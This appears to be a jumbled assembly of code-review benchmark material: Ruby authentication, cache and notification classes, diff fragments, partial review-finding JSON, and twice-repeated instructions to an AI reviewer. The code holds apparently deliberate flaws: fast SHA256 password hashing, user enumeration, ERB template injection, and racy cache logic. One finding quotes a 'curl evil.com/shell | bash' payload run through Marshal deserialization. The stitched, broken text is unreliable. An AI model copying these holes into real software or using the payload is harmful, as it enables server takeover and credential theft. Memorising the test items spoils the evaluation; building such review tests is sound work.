3: require 'digest'
4: require 'securerandom'
5: 
6: class AuthenticationService
7:   MAX_FAILED_ATTEMPTS = 5
8:   LOCKOUT_DURATION = 900 # 15 minutes in seconds
9: 
10:   def initialize(user_repo, session_store, logger)
11:     @user_repo = user_repo
12:     @session_store = session_store
13:     @logger = logger
14:   end
15: 
16:   def authenticate(username, password, session)
17:     user = @user_repo.find_by_username(username)
18:     return { success: false, error: 'user_not_found' } unless user
19: 
20:     if account_locked?(user)
21:       @logger.warn("Login attempt on locked account: #{username}")
22:       return { success: false, error: 'account_locked' }
23:     end
24: 
25:     stored_hash = user.password_hash
26:     computed_hash = Digest::SHA256.hexdigest(password + user.salt)
27: 
28:     if stored_hash == computed_hash
29:       reset_failed_attempts(user)
30:       session[:user_id] = user.id
31:       session[:authenticated_at] = Time.now.to_i
32:       token = generate_session_token(user)
33:       @session_store.save(token, user.id)
34:       @logger.info("User #{username} authenticated successfully")
35:       { success: true, token: token, user_id: user.id }
36:     else
37:       record_failed_attempt(user)
38:       @logger.warn("Failed login for #{username}")
39:       { success: false, error: 'invalid_credentials' }
40:     end
41:   rescue => e
42:     @logger.error("Authentication error: #{e.message}")
43:     nil
44:   end
45: 
46:   def logout(token, session)
47:     @session_store.delete(token)
48:     session.clear
49:     { success: true }
50:   end
51: 
52:   def validate_session(token)
53:     user_id = @session_store.get(token)
54:     return nil unless user_id
55: 
56:     user = @user_repo.find_by_id(user_id)
57:     return nil unless user&.active?
58: 
59:     { valid: true, user_id: user_id, user: user }
60:   end
61: 
62:   private
63: 
64:   def generate_session_token(user)
65:     SecureRandom.hex(32)
66:   end
67: 
68:   def account_locked?(user)
69:     return false unless user.locked_at
70: 
71:     if Time.now.to_i - user.locked_at.to_i < LOCKOUT_DURATION
72:       true
73:     else
74:       unlock_account(user)
75:       false
76:     end
77:   end
78: 
79:   def record_failed_attempt(user)
80:     user.failed_attempts += 1
81:     if user.failed_attempts >= MAX_FAILED_ATTEMPTS
82:       user.locked_at = Time.now
83:       @logger.warn("Account locked: #{user.username}")
84:     end
85:     @user_repo.save(user)
86:   end
87: 
88:   def reset_failed_attempts(user)
89:     user.failed_attempts = 0
90:     user.locked_at = nil
91:     @user_repo.save(user)
92:   end
93: 
94:   def unlock_account(user)
95:     user.locked_at = nil
96:     user.failed_attempts = 0
97:     @user_repo.save(user)
98:   end
99: end

59 +    { valid: true, user_id: user_id, user: user }
60 +  end
61 +
62 +  private
63 +
64 +  def generate_session_token(user)
65 +    SecureRandom.hex(32)
66 +  end
67 +
68 +  def account_locked?(user)
69 +    return false unless user.locked_at
70 +
71 +    if Time.now.to_i - user.locked_at.to_i < LOCKOUT_DURATION
72 +      true
73 +    else
74 +      unlock_account(user)
75 +      false
76 +    end
77 +  end
78 +
79 +  def record_failed_attempt(user)
80 +    user.failed_attempts += 1

83 +      @logger.warn("Account locked: \#{user.username}")

89 +    user.failed_attempts = 0
90 +    user.locked_at = nil
91 +    @user_repo.save(user)
92 +  end
93 +
94 +  def unlock_account(user)
95 +    user.locked_at = nil
96 +    user.failed_attempts = 0

5: class CacheStore
6:   DEFAULT_TTL = 3600 # 1 hour in seconds
7:   MAX_SIZE = 10_000
8: 
9:   def initialize(ttl: DEFAULT_TTL, max_size: MAX_SIZE)
10:     @store = {}
11:     @ttl = ttl
12:     @max_size = max_size
13:     @mutex = Mutex.new
14:     @access_order = []
15:   end
16: 
17:   def get(key)
18:     @mutex.synchronize do
19:       entry = @store[key]
20:       return nil unless entry
21: 
22:       if expired?(entry)
23:         @store.delete(key)
24:         @access_order.delete(key)
25:         return nil
26:       end
27: 
28:       touch(key)
29:       entry[:value]
30:     end
31:   end
32: 
33:   def set(key, value, ttl: nil)
34:     @mutex.synchronize do
35:       evict_lru if @store.size >= @max_size && !@store.key?(key)
36: 
37:       @store[key] = {
38:         value: value,
39:         expires_at: Time.now + (ttl || @ttl),
40:         created_at: Time.now
41:       }
42:       touch(key)
43:     end
44:   end
45: 
46:   def fetch(key, &block)
47:     @mutex.synchronize do
48:       existing = @store[key]
49:       if existing && !expired?(existing)
50:         touch(key)
51:         return existing[:value]
52:       end
53: 
54:       value = block.call
55:       @store[key] = {
56:         value: value,
57:         expires_at: Time.now + @ttl,
58:         created_at: Time.now
59:       }
60:       touch(key)
61:       value
62:     end
63:   end
64: 
65:   def delete(key)
66:     @mutex.synchronize do
67:       @store.delete(key)
68:       @access_order.delete(key)
69:     end
70:   end
71: 
72:   def clear
73:     @mutex.synchronize do
74:       @store.clear
75:       @access_order.clear
76:     end
77:   end
78: 
79:   def cleanup_expired
80:     @mutex.synchronize do
81:       @store.each do |key, entry|
82:         if expired?(entry)
83:           @store.delete(key)
84:           @access_order.delete(key)
85:         end
86:       end
87:     end
88:   end
89: 
90:   def get_or_set(key)
91:     @store[key] ||= fetch_from_source(key)
92:   end
93: 
94:   def size
95:     @store.size
96:   end
97: 
98:   private
99: 
100:   def expired?(entry)
101:     Time.now > entry[:expires_at]
102:   end
103: 
104:   def touch(key)
105:     @access_order.delete(key)
106:     @access_order.push(key)
107:   end
108: 
109:   def evict_lru
110:     lru_key = @access_order.shift
111:     @store.delete(lru_key) if lru_key
112:   end
113: 
114:   def fetch_from_source(key)
115:     # Placeholder for external data source lookup
116:     nil
117:   end
118: end

5 +class CacheStore
6 +  DEFAULT_TTL = 3600 # 1 hour in seconds

9 +  def initialize(ttl: DEFAULT_TTL, max_size: MAX_SIZE)
10 +    @store = {}

13 +    @mutex = Mutex.new
14 +    @access_order = []
15 +  end

17 +  def get(key)
18 +    @mutex.synchronize do
19 +      entry = @store[key]
20 +      return nil unless entry
21 +
22 +      if expired?(entry)
23 +        @store.delete(key)
24 +        @access_order.delete(key)
25 +        return nil
26 +      end
27 +
28 +      touch(key)
29 +      entry[:value]
30 +    end
31 +  end
32 +
33 +  def set(key, value, ttl: nil)
34 +    @mutex.synchronize do
35 +      evict_lru if @store.size >= @max_size && !@store.key?(key)
36 +
37 +      @store[key] = {
38 +        value: value,
39 +        expires_at: Time.now + (ttl || @ttl),
40 +        created_at: Time.now
41 +      }
42 +      touch(key)
43 +    end

45 +
46 +  def fetch(key, &block)
47 +    @mutex.synchronize do
48 +      existing = @store[key]
49 +      if existing && !expired?(existing)
50 +        touch(key)
51 +        return existing[:value]
52 +      end
53 +
54 +      value = block.call
55 +      @store[key] = {
56 +        value: value,
57 +        expires_at: Time.now + @ttl,
58 +        created_at: Time.now
59 +      }
60 +      touch(key)
61 +      value
62 +    end

80 +    @mutex.synchronize do
81 +      @store.each do |key, entry|

84 +          @access_order.delete(key)
85 +        end
86 +      end
87 +    end
88 +  end
89 +

92 +  end

103 +

3: require 'erb'
4: require 'json'
5: 
6: class NotificationDispatcher
7:   RATE_LIMIT = 100 # max notifications per minute
8: 
9:   def initialize(email_client, sms_client, push_client, logger)
10:     @email_client = email_client
11:     @sms_client = sms_client
12:     @push_client = push_client
13:     @logger = logger
14:     @sent_count = 0
15:     @last_reset = Time.now
16:   end
17: 
18:   def dispatch(user, event, template_str = nil)
19:     return { success: false, error: 'rate_limited' } if rate_limited?
20: 
21:     channel = resolve_channel(user)
22:     return { success: false, error: 'no_channel' } unless channel
23: 
24:     message = build_message(event, template_str, user)
25: 
26:     result = case channel
27:     when :email
28:       send_email(user, message)
29:     when :sms
30:       send_sms(user, message)
31:     when :push
32:       send_push(user, message)
33:     else
34:       { success: false, error: 'unknown_channel' }
35:     end
36: 
37:     @sent_count += 1
38:     @logger.info("Notification sent via #{channel} to user #{user.id}")
39:     result
40:   end
41: 
42:   def broadcast(event, template_str = nil)
43:     users = User.all.select { |u| u.subscribed? }
44:     results = []
45: 
46:     users.each do |user|
47:       results << dispatch(user, event, template_str)
48:     end
49: 
50:     {
51:       total: users.size,
52:       sent: results.count { |r| r[:success] },
53:       failed: results.count { |r| !r[:success] }
54:     }
55:   end
56: 
57:   private
58: 
59:   def resolve_channel(user)
60:     preferred = user.preferences.notification_channel
61: 
62:     if preferred == :email && user.email.present?
63:       :email
64:     elsif preferred == :sms && user.phone.present?
65:       :sms
66:     elsif preferred == :push && user.device_token.present?
67:       :push
68:     else
69:       nil
70:     end
71:   end
72: 
73:   def build_message(event, template_str, user)
74:     template = template_str || default_template(event)
75:     ERB.new(template).result(binding)
76:   end
77: 
78:   def default_template(event)
79:     "Hello, you have a new notification: #{event.to_s}"
80:   end
81: 
82:   def send_email(user, message)
83:     @email_client.deliver(
84:       to: user.email,
85:       subject: 'Notification',
86:       body: message
87:     )
88:     { success: true, channel: :email }
89:   end
90: 
91:   def send_sms(user, message)
92:     phone = user.phone.gsub(/[^0-9+]/, '')
93:     @sms_client.send(to: phone, body: message)
94:     { success: true, channel: :sms }
95:   end
96: 
97:   def send_push(user, message)
98:     @push_client.notify(token: user.device_token, body: message)
99:     { success: true, channel: :push }
100:   end
101: 
102:   def rate_limited?
103:     if Time.now - @last_reset > 60
104:       @sent_count = 0
105:       @last_reset = Time.now
106:     end
107: 
108:     @sent_count >= RATE_LIMIT
109:   end
110: end

Since there is no `rescue` block around these calls, any invalid user input causes an unhandled exception that propagates up as a 500 Internal Server Error. Concrete scenario: a user submits a report form with `start_date: \"yesterday\"` -- Ruby's `Date.parse` cannot parse the word \"yesterday\", raises `ArgumentError: invalid date`, and the entire request crashes.     "improvedCode": "  def generate_csv(records)\n    CSV.generate do |csv|\n      csv << records.first.keys\n      records.each do |record|\n        csv << record.values.map(&:to_s)\n      end\n    end\n  end",
    "relevantFile": "app/services/report_generator.rb",
    "relevantLinesStart": 41,
    "relevantLinesEnd": 49,
    "suggestionContent": "String concatenation in a loop using `+=` at lines 44 and 46. In Ruby, strings are mutable, but `csv += ...` creates a new String object on every iteration: the old string is copied, the new content is appended, and the old copy is discarded. For `n` records, this is O(n^2) time and memory due to repeated copying. Concrete scenario: generating a CSV with 100,000 records -- each iteration copies the entire accumulated string, resulting in ~5 billion character copies total, turning a sub-second operation into minutes. Should use `CSV.generate` or build an array of lines and join at the end.",
    "oneSentenceSummary": "String concatenation with += in loop is O(n^2); use CSV.generate or array join instead."

This iterates from `start_date` up to but NOT including `end_date`. Concrete scenario: a user requests a report from `2024-01-01` to `2024-01-31` -- the report silently excludes January 31st because the three-dot range stops at January 30th. The user sees incomplete data with no warning. Should use the inclusive range operator `..` (two dots) to include the end date in the report.",

      if job
        process_job(job, worker_id)
        idle_wait = 0.1
      else
        sleep(idle_wait)
        idle_wait = [idle_wait * 2, max_wait].min
      end
    end
  end",
    "relevantFile": "app/jobs/background_job_processor.rb",
    "relevantLinesStart": 26,
    "relevantLinesEnd": 35,
    "suggestionContent": "Polling with `sleep(0.1)` in a tight loop at line 32. Each worker thread queries the database every 100 milliseconds when idle: `Job.where(status: 'queued').order(:priority).first`. With 5 workers, this is 50 queries per second hitting the database even when the queue is empty. Concrete scenario: during off-peak hours when no jobs are queued for hours, the processor still fires 180,000 queries per hour (50/sec * 3600), wasting database connections and I/O. This also keeps the Ruby threads active, preventing the GVL from being fully released. Should use exponential backoff on idle, or use PostgreSQL LISTEN/NOTIFY to be notified when new jobs arrive.",

  },

    "suggestionContent": "`Marshal.load(job.serialized_args)` at line 49 deserializes arbitrary Ruby objects from the database. `Marshal.load` can instantiate ANY Ruby class and call its `marshal_load` method, enabling arbitrary code execution. If an attacker can insert a crafted payload into the `serialized_args` column (e.g., via SQL injection in another part of the application, or a compromised job producer), they can execute arbitrary system commands on the server. Concrete scenario: an attacker stores a marshaled `Gem::Installer` or `ERB` object that calls `system('curl evil.com/shell | bash')` when deserialized. This is a well-known Ruby deserialization attack vector (similar to Java's `ObjectInputStream`). Should use `JSON.parse` for job arguments which only allows safe primitive types.",

44 +    {
45 +      client: client_key,
46 +      count: count,

66 +      'X-RateLimit-Remaining' => '0',

68 +    }

vars.prSummary: Refactored EventBus: replaced Singleton with class-level .current, introduced typed Event classes, subscribe now takes event class + method instead of string + block, publish now requires Event instances.

## External Context & Injected Knowledge

The following information is provided to ground your analysis in the broader system reality. Use this as your source of truth.

---

### Codebase Context (REAL CODE — treat as visible evidence)

The snippets below are **actual code from the repository** (not hypothetical). They show callers, consumers, upstream dependencies, or infrastructure used by the code being changed in this PR.

**You MUST check for broken contracts between the diff and these snippets:**
- A caller passing a string literal (event name, key, enum value) that no longer exists in the mapping/config changed by the diff
- A consumer relying on a return type, enum value, event name, or config key that the diff renames, changes, or removes
- A caller passing arguments that no longer match the new function signature
- A mapping/config that references identifiers renamed or deleted in the diff

**EQUALLY IMPORTANT — use snippets to DISCARD false concerns:**
These snippets are your source of truth about how the surrounding codebase works. Before reporting ANY issue, check whether a snippet already answers or refutes your concern. If a snippet provides evidence that your concern is already handled — by any mechanism visible in the snippet — you MUST discard the suggestion. Do NOT ignore snippet evidence to justify a finding.

Examples of when to discard:
- A snippet shows a wrapper function already sanitizes input → do not report injection in the inner function
- A snippet shows an ORM enforces constraints at the DB level → do not report missing validation in application code
- A snippet shows retry/backoff logic around a network call → do not report unhandled transient failures in the caller

**PRIORITY: Runtime-breaking bugs (wrong string literal, removed enum value, renamed key) take absolute priority over type-narrowing or type-safety improvements.** If a snippet shows code that WILL throw an error or silently fail at runtime, ALWAYS report it as a bug — even if you also see type-level improvements to suggest. Do NOT report type improvements instead of a runtime bug.

**HOW TO REPORT cross-file bugs:**
- Set `relevantFile` to the file under review (the diff file), since that is where the breaking change was introduced
- Set `relevantLinesStart/End` to the diff lines that introduced the breaking change
- In `suggestionContent`, explicitly name the cross-file consumer that will break (e.g., "PaymentService.ts still calls send(\"paymentCaptured\") but this event no longer exists in the mapping")
- The proof IS the snippet — you do not need to guess hypothetical inputs. The snippet is real code that will execute

vars.prSummary: Refactored HttpClient from Net::HTTP to Faraday with retry middleware. Changed post/put/patch from keyword body: to positional parameter. Responses are now Faraday::Response objects instead of Net::HTTPResponse.

## External Context & Injected Knowledge

The following information is provided to ground your analysis in the broader system reality. Use this as your source of truth.

---

### Codebase Context (REAL CODE — treat as visible evidence)

The snippets below are **actual code from the repository** (not hypothetical). They show callers, consumers, upstream dependencies, or infrastructure used by the code being changed in this PR.

**You MUST check for broken contracts between the diff and these snippets:**
- A caller passing a string literal (event name, key, enum value) that no longer exists in the mapping/config changed by the diff
- A consumer relying on a return type, enum value, event name, or config key that the diff renames, changes, or removes
- A caller passing arguments that no longer match the new function signature
- A mapping/config that references identifiers renamed or deleted in the diff

**EQUALLY IMPORTANT — use snippets to DISCARD false concerns:**
These snippets are your source of truth about how the surrounding codebase works. Before reporting ANY issue, check whether a snippet already answers or refutes your concern. If a snippet provides evidence that your concern is already handled — by any mechanism visible in the snippet — you MUST discard the suggestion. Do NOT ignore snippet evidence to justify a finding.

Examples of when to discard:
- A snippet shows a wrapper function already sanitizes input → do not report injection in the inner function
- A snippet shows an ORM enforces constraints at the DB level → do not report missing validation in application code
- A snippet shows retry/backoff logic around a network call → do not report unhandled transient failures in the caller

**PRIORITY: Runtime-breaking bugs (wrong string literal, removed enum value, renamed key) take absolute priority over type-narrowing or type-safety improvements.** If a snippet shows code that WILL throw an error or silently fail at runtime, ALWAYS report it as a bug — even if you also see type-level improvements to suggest. Do NOT report type improvements instead of a runtime bug.

**HOW TO REPORT cross-file bugs:**
- Set `relevantFile` to the file under review (the diff file), since that is where the breaking change was introduced
- Set `relevantLinesStart/End` to the diff lines that introduced the breaking change
- In `suggestionContent`, explicitly name the cross-file consumer that will break (e.g., "PaymentService.ts still calls send(\"paymentCaptured\") but this event no longer exists in the mapping")
- The proof IS the snippet — you do not need to guess hypothetical inputs. The snippet is real code that will execute
